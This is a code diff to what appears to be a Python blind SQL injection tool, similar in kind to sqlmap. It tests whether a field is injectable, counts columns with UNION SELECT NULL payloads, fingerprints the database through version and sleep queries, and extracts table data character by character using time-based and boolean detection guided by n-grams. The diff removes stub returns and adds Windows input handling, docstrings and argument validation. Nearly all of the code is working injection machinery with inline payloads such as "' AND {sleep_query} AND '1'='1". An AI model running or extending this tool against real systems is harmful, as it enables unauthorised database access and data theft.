@@ -2,6 +2,8 @@ import time
 import requests
 import string
 import argparse
+import platform
+import msvcrt
 import json
 import os
 import sys
@@ -11,10 +13,7 @@ from urllib.parse import unquote
 from gramification import gramify
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
-
 ### Constants and Usage
-
 
 def usage():
     usage = """
@@ -67,7 +66,6 @@ def load_request(file_path):
 
 
 def load_grams(grams_file_path):
-    """Load the grams.json file provided by the user."""
     try:
         with open(grams_file_path, 'r') as file:
             grams = json.load(file)
@@ -117,6 +115,10 @@ def is_injectable(request_template, injectable_headers={}, static_headers={}, ar
     """
     checks if the field is injectable using true and false conditions. also determines the detection method for later use.
     no need for threading, its 2 payloads. if this step fails, give up (or dont im not your dad).
+    requests are handled in the inject helper function, detection happens locally. if using sleep_only, skips the check entirely.
+
+    Required Arguments: args
+    Returns: is_injectable, detection
     """
 
     if args.sleep_only:
@@ -199,9 +201,13 @@ def is_injectable(request_template, injectable_headers={}, static_headers={}, ar
 
 def column_count(detection, workers, request_template, queries, injectable_headers, static_headers, args=None):
     """
-    we're counting columns baybeeee
+    we're counting columns baybeeee. this function utilizes UNION SELECT statements and NULL values to match the column output of the original sql query.
+    detection is handled by the detect helper function, and requests are handled by the inject helper function.
+
+    Required Arguments: detection, workers, queries, args
+    Returns: columns
     """
-    return 2
+    #return 2
 
     print("[*] Attempting to count columns...")
 
@@ -218,7 +224,7 @@ def column_count(detection, workers, request_template, queries, injectable_heade
     sleep_queries = queries.get("sleep_queries", [])
     tasks = []
     columns_found = False
-    columns = 1
+    columns = 0
 
     with ThreadPoolExecutor(max_workers=workers) as executor:
         while not columns_found:
@@ -229,7 +235,7 @@ def column_count(detection, workers, request_template, queries, injectable_heade
                         continue
                     sleep_query = sleep_query.replace('%', str(args.sleep_only))
 
-                    payload = f"' AND {sleep_query} UNION SELECT {','.join(['NULL'] * columns)},'1'='1"
+                    payload = f"' AND {sleep_query} UNION SELECT {','.join(['NULL'] * columns)}{',' if columns > 0 else ""}'1'='1"
                     encoded_payload = quote(payload)
                     if args.delay > 0:
                         if args.verbose:
@@ -246,7 +252,7 @@ def column_count(detection, workers, request_template, queries, injectable_heade
                                                  sleep_query=sleep_query, args=args,
                                                  db_specific=None, queries=queries))
             else:
-                payload = f"' UNION SELECT {','.join(['NULL'] * columns)}, '1'='1"
+                payload = f"' UNION SELECT {','.join(['NULL'] * columns)}{',' if columns > 0 else ""}'1'='1"
                 encoded_payload = quote(payload)
                 if args.delay > 0:
                     if args.verbose:
@@ -279,12 +285,16 @@ def detect_database(detection, columns, workers, request_template, queries, sl_q
     """
     attempts to determine what we're dealing with. detection happens in two stages because of the way the json is structured. 
     in the case that the version query is used for multiple databases, a second batch of requests is sent to determine a more specific database.
+    if using sleep detection, that order is reversed. a successful sleep query will lead to a version query to narrow down the database.
     this is not foolproof. many of the databases that use the same version queries also use the same sleep queries. the first positive ID will be the defacto database.
-    this isn't actually that big of a deal because if a database uses identical version queries and sleep queries, the length queries are typically also identical.
-    the actual detection is handled in the detect helper function, and the actual requests are handled in the inject helper function.
+    this isn't actually that big of a deal because if a database uses identical version queries and sleep queries, the length queries and substring queries are typically also identical.
+    the detection is handled in the detect helper function, and the requests are handled in the inject helper function.
     just don't like, quote me on the database. my goal is to extract data, not provide you with the database. good enough is good enough.
+
+    Required Arguments: detection, columns, workers, queries, args
+    Returns: db_name, substring_query, sleep_query, length_query
     """
-    return "MariaDB","SUBSTRING","SLEEP(8)","LENGTH"
+    #return "MariaDB","SUBSTRING","SLEEP(8)","LENGTH"
 
     print("[*] Attempting to detect the database type...")
 
@@ -460,19 +470,22 @@ def detect_database(detection, columns, workers, request_template, queries, sl_q
     return None, None, None, None
 
 
-def discover_length(table, column, where_clause, db_name, substring_query, sleep_query, length_query, detection, request_template, injectable_headers={}, static_headers={}, args=None):
+def discover_length(table, column, where_clause, db_name, sleep_query, length_query, detection, request_template, injectable_headers={}, static_headers={}, args=None):
     """
     to optimize the data extraction process, we need the length of the data. this function uses a binary search algorithm to narrow down the length of the data. 
     the maximum length that this function will search for is determined by the user (hopefully) but defaults to 1000 if a length isn't provided.
     why 1000 you ask? because its a nice round number and seemed like a decent catch all without affecting performance too terribly. change it if you like.
-    the requests and detection are handled within this function because i didnt think it needed a helper function
+    the requests and detection are handled within this function because i didnt think it needed a helper function.
+
+    Required Arguments: table, column, where_clause, length_query, detection, args
+    Returns: length
     """
 
-    return 17
+    #return 17
 
     if not length_query or length_query == "N/A":
         print(f"[-] Length query not found for {db_name}. Skipping data length detection.")
-        return db_name, substring_query, sleep_query, None
+        return None
 
     print(f"[*] Attempting to discover the length of the data for {table}.{column} using {length_query}...")
 
@@ -559,11 +572,14 @@ def discover_length(table, column, where_clause, db_name, substring_query, sleep
         return None
 
 
-def extract_data(table, column, where_clause, substring_query, sleep_query, length, position, extraction, workers, request_template, injectable_headers={}, static_headers={}, args=None):
+def extract_data(table, column, where_clause, substring_query, sleep_query, length, extraction, workers, request_template, injectable_headers={}, static_headers={}, args=None):
     """
-    now we're cookin with gas. this function extracts data in a variety of ways, but the default behavior is a threaded charcter-by-character approach. 
-    if that doesnt tickle your fancy, you can provide a dictionary or use a binary search algorithm. the world is your oyster or something.
-    the detection is handled in the extract helper function, and the actual requests are handled in the inject helper function.
+    now we're cookin with gas. this function extracts data in a variety of ways. the default behavior is a threaded charcter-by-character approach with a standard set of letter frequencies and ngrams.
+    if that doesnt tickle your fancy, you can provide a dictionary, use a binary search algorithm, or provide a more tailored piece of sample text for custom ngrams. the world is your oyster or something.
+    detection is handled in the extract helper function, requests are handled in the inject helper function, and character prioritization is handled in the prioritize_characters helper function.
+
+    Required Arguments: table, column, where_clause, substring_query, extraction, workers, args
+    Returns: extracted_data
     """
 
     print("[*] Attempting to extract data...")
@@ -572,6 +588,7 @@ def extract_data(table, column, where_clause, substring_query, sleep_query, leng
     grams = load_grams(grams_file)
     extracted_data = ""
     wordlist = None
+    position = 1
 
     if args.dictionary_attack:
         try:
@@ -777,62 +794,92 @@ def extract_data(table, column, where_clause, substring_query, sleep_query, leng
 
 
 def no_length():
-    print("[-] Unable to determine data length. Do you want to proceed with extraction without data length? (y/n): ",
-          end='', flush=True)
+    print("[-] Unable to determine data length. Do you want to proceed with extraction without data length? (y/n): ", end='', flush=True)
 
-    i, _, _ = select.select([sys.stdin], [], [], 60)
-
-    if i:
-        user_input = sys.stdin.readline().strip().lower()
-        if user_input == 'y':
-            return True
-        elif user_input == 'n':
-            return False
+    if platform.system() == "Windows":
+        start_time = time.time()
+        while True:
+            if (time.time() - start_time) > 10:
+                print("\n[*] No input received. Proceeding with extraction anyway.")
+                return True
+            if msvcrt.kbhit():
+                user_input = input().strip().lower()
+                return user_input == 'y'
     else:
-        print("\n[*] No input received. Proceeding with extraction anyway.")
-        return True
+        i, _, _ = select.select([sys.stdin], [], [], 60)
+        if i:
+            user_input = sys.stdin.readline().strip().lower()
+            return user_input == 'y'
+        else:
+            print("\n[*] No input received. Proceeding with extraction anyway.")
+            return True
 
 
 def one_third():
-    print(
-        "\n[*] A third or less of the data remains to be extracted. It is unlikely that the remaining data will be contained in the wordlist.")
+    print("\n[*] A third or less of the data remains to be extracted. It is unlikely that the remaining data will be contained in the wordlist.")
     print("[*] Would you like to fallback to character-by-character extraction? (y/n): ", end='', flush=True)
 
-    i, _, _ = select.select([sys.stdin], [], [], 60)
-
-    if i:
-        user_input = sys.stdin.readline().strip().lower()
-        if user_input == 'y':
-            return True
-        elif user_input == 'n':
-            return False
+    if platform.system() == "Windows":
+        start_time = time.time()
+        while True:
+            if (time.time() - start_time) > 10:
+                print("\n[*] No input received. Fallback to character extraction will proceed automatically.")
+                return True
+            if msvcrt.kbhit():
+                user_input = input().strip().lower()
+                if user_input == 'y':
+                    return True
+                elif user_input == 'n':
+                    return False
     else:
-        print("\n[*] No input received. Fallback to character extraction will proceed automatically.")
-        return True
+        i, _, _ = select.select([sys.stdin], [], [], 60)
+        if i:
+            user_input = sys.stdin.readline().strip().lower()
+            if user_input == 'y':
+                return True
+            elif user_input == 'n':
+                return False
+        else:
+            print("\n[*] No input received. Fallback to character extraction will proceed automatically.")
+            return True
 
 
 def spent():
-    print(
-        "\n[*] Wordlist exhausted. Would you like to extract a single character at the current position and retry the wordlist? (y/n): ",
-        end='', flush=True)
+    print("\n[*] Wordlist exhausted. Would you like to extract a single character at the current position and retry the wordlist? (y/n): ", end='', flush=True)
 
-    i, _, _ = select.select([sys.stdin], [], [], 60)
-
-    if i:
-        user_input = sys.stdin.readline().strip().lower()
-        if user_input == 'y':
-            return True
-        elif user_input == 'n':
-            return False
+    if platform.system() == "Windows":
+        start_time = time.time()
+        while True:
+            if (time.time() - start_time) > 10:
+                print("\n[*] No input received. Proceeding with character extraction automatically.")
+                return True
+            if msvcrt.kbhit():
+                user_input = input().strip().lower()
+                if user_input == 'y':
+                    return True
+                elif user_input == 'n':
+                    return False
     else:
-        print("\n[*] No input received. Proceeding with character extraction automatically.")
-        return True
+        i, _, _ = select.select([sys.stdin], [], [], 60)
+        if i:
+            user_input = sys.stdin.readline().strip().lower()
+            if user_input == 'y':
+                return True
+            elif user_input == 'n':
+                return False
+        else:
+            print("\n[*] No input received. Proceeding with character extraction automatically.")
+            return True
 
 
 ### Helper Functions <3
 
 
 def parse_request(file_content):
+    """
+    parses the request file and returns packaged data to be ingested by the requests library
+    """
+
     lines = file_content.splitlines()
 
     if not lines:
@@ -866,11 +913,12 @@ def parse_request(file_content):
 
 def prioritize_characters(grams, extracted_chars, position, length):
     """
-    Prioritize characters based on the last 1-3 extracted characters using bigrams, trigrams, and quadgrams.
-    Also, handle the case for the first and last characters using the starting_chars and ending_chars data from grams.json.
-    Fallback to general frequency-based prioritization if no match is found in the n-grams.
+    prioritizes characters based on the last 1-3 extracted characters using bigrams, trigrams, and quadgrams.
+    handles first and last characters of the data to be extracted as special cases.
+    fallback to general frequency-based prioritization if no match is found in the n-grams.
     """
     n = len(extracted_chars)
+    CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
     quadgram_probs = trigram_probs = bigram_probs = {}
     quadgram_total = trigram_total = bigram_total = 0
 
@@ -931,7 +979,6 @@ def send_request(request_line=None, headers=None, body=None, args=None):
             host = headers.get("Host")
             protocol = "https" if args.url.startswith("https") else "http"
             fully_qualified_url = protocol + "://" + host + path
-            #print(fully_qualified_url)
         else:
             url = args.url
         if method == "POST":
@@ -955,6 +1002,10 @@ def send_request(request_line=None, headers=None, body=None, args=None):
 
 
 def baseline_request(request_template, injectable_headers={}, static_headers={}, args=None):
+    """
+    just a simple baseline request, no injection, no payloads. just makes sure the line works and provides other functions
+    with a baseline to test against.
+    """
     start_time = time.time()
     if request_template:
         request_line, headers, body = request_template
@@ -982,9 +1033,8 @@ def inject(encoded_payload, request_template, injectable_headers, static_headers
     """
     sends the requests if a request template is not provided. locked to GET and POST if you don't provide a request template.
     this is where the actual injection happens. an encoded payload is attached to whatever field is desired. 
-    if a request template is provided, the placeholder in the template is overwritten and the request is passed to send_request.
+    if a request template is provided, this function overwrites the INJECT placeholder and hands the request to send_request.
     all functions that involve sql injection rely on this function. it is reeeeeeaaaalllyyy important.
-    this function also handles the delay between requests.
     """
 
     try:
@@ -1026,9 +1076,10 @@ def inject(encoded_payload, request_template, injectable_headers, static_headers
 
 def detect(encoded_payload, db_name, detection, queries, injectable_headers, static_headers, baseline_status_code, baseline_content_length, request_template=None, db_specific=None, sleep_query=None, args=None):
     """
-    handles the detection for detect_database and provides the helper function, inject, with the encoded payload and request info.
+    handles the detection for detect_database, column_count, and lower. also provides the helper function, inject, with encoded payloads and request info.
+    crucially, this function finds the substring and length queries for the database it is currently querying.
+    this function will be called by column_count and lower with the database name "unknown," prompting a true or falsy return.
     no actual request is sent by this function. it relies on the helper function, inject.
-    this function also finds the related queries of the database its currently handling and passes them along.
     """
     if db_name != "unknown":
         substring_query = queries[db_name].get("substring_query", None)
@@ -1052,8 +1103,6 @@ def detect(encoded_payload, db_name, detection, queries, injectable_headers, sta
 
         if response is None:
             return None, None, None, None
-
-        #print (response)
 
         if args.sleep_only and (response_time > args.sleep_only):
             if db_name == "unknown":
@@ -1091,7 +1140,7 @@ def detect(encoded_payload, db_name, detection, queries, injectable_headers, sta
 
 def lower(sleep_query, request_template, baseline_status_code, baseline_content_length, queries, injectable_headers, static_headers, args):
     """
-    optimize sleep time
+    optimizes sleep time using a binary search algorithm. detection is handled in the helper function detect and requests are handled by the helper function inject
     """
     print("[*] Starting binary search for the minimum reliable sleep time...")
 
@@ -1102,7 +1151,6 @@ def lower(sleep_query, request_template, baseline_status_code, baseline_content_
         mid = (low + high) // 2
         if args.verbose:
             print(f"[VERBOSE] Testing sleep time: {mid} seconds")
-
         sleep_query = sleep_query.replace('%', str(mid))
         payload = f"' AND {sleep_query} AND '1'='1"
         encoded_payload = quote(payload)
@@ -1111,7 +1159,7 @@ def lower(sleep_query, request_template, baseline_status_code, baseline_content_
                 print(f"[VERBOSE] Delaying for {args.delay} seconds...")
             time.sleep(args.delay)
 
-        task = detect(
+        sleep_time = detect(
             encoded_payload=encoded_payload,
             db_name="unknown",
             detection="sleep",
@@ -1127,7 +1175,7 @@ def lower(sleep_query, request_template, baseline_status_code, baseline_content_
 
         sleep_query = sleep_query.replace(str(mid), '%')
 
-        if task:
+        if sleep_time:
             new_sleep = mid
             high = mid - 1
             print(f"[+] Sleep time of {mid} seconds is reliable. Trying to lower further.")
@@ -1216,12 +1264,11 @@ def arg_parse():
         usage()
         return
 
-    if not args.url and not args.file:
-        print("[!] You must provide either a URL (-u) or a request file (-f).")
+    if not args.url:
+        print("[!] You must provide a URL (-u).")
         return
     if args.url and not args.file and not (args.injectable_headers or args.data):
-        print(
-            "[!] You must provide either injectable headers (-ih) or data to be sent in the request body (-d) when specifying a URL.")
+        print("[!] You must provide either injectable headers (-ih) or data to be sent in the request body (-d) when specifying a URL.")
         return
     if (args.injectable_headers or args.data or args.file) and not (args.table and args.column and args.where):
         print("[!] You must provide a column (-c), table (-t), and where clause (-w) for data extraction.")
@@ -1229,11 +1276,41 @@ def arg_parse():
     if args.data and args.file:
         print("[!] You cannot specify data for the request file outside of the request file.")
         return
+    if (args.injectable_headers or args.static_headers) and args.file:
+        print("[!] You cannot specify headers for the request file outside of the request file.")
+        return
     if args.sleep_only and args.sleep_only < 1:
-        print(
-            "[!] Sleep time must be greater than or equal to 1. At least 10 seconds is recommended. Example: --sleep-only 10")
+        print("[!] Sleep time must be greater than or equal to 1. At least 10 seconds is recommended. Example: --sleep-only 10")
+        return
+    if args.timeout < 3:
+        print("[!] Timeout value must be at least 3 seconds. The smaller the number the higher the fail rate. The recommended timeout is 10. Reconsider.")
+        return
+    if args.top_n and not args.gramify:
+        print("[!] You cannot specify a top number of n-grams without creating new n-grams. Example --gramify <file path> --top-n 5")
+        return
+    if args.top_n > 50:
+        print("[!] The --top-n value is too high. This will slow down the extraction process. 10-20 is recommended. Reconsider.")
+        return
+    if args.file and not os.path.exists(args.file):
+        print(f"[!] The provided request file path {args.file} does not exist or cannot be accessed.")
+        return
+    if args.gramify and not os.path.exists(args.gramify):
+        print(f"[!] The provided gramify file path {args.gramify} does not exist or cannot be accessed.")
+        return
+    if args.dictionary_attack and not os.path.exists(args.dictionary_attack):
+        print(f"[!] The provided dictionary file path {args.dictionary_attack} does not exist or cannot be accessed.")
+        return
+    if args.binary_attack and args.dictionary_attack:
+        print ("[!] Binary attacks and dictionary attacks are mutually exclusive. Choose one.")
+        return
+    if args.force == 'keyword' and not (args.true_keywords or args.false_keywords):
+        print("[!] You must provide --true-keywords or --false-keywords when forcing keyword-based detection.")
+        return
+    if args.dictionary_attack and args.gramify:
+        print("[*] Custom n-grams will only marginally speed up a dictionary attack. Feel free to use them, but measure your expectations.")
     if args.sleep_only:
         args.timeout += args.sleep_only
+
     return args
 
 
@@ -1309,7 +1386,6 @@ def main():
         column=args.column,
         where_clause=args.where,
         db_name=db_name,
-        substring_query=substring_query,
         sleep_query=sleep_query,
         length_query=length_query,
         detection=detection,
@@ -1335,7 +1411,6 @@ def main():
         substring_query=substring_query,
         sleep_query=sleep_query,
         length=length,
-        position=1,
         extraction=detection,
         request_template=request_template,
         injectable_headers=injectable_headers,
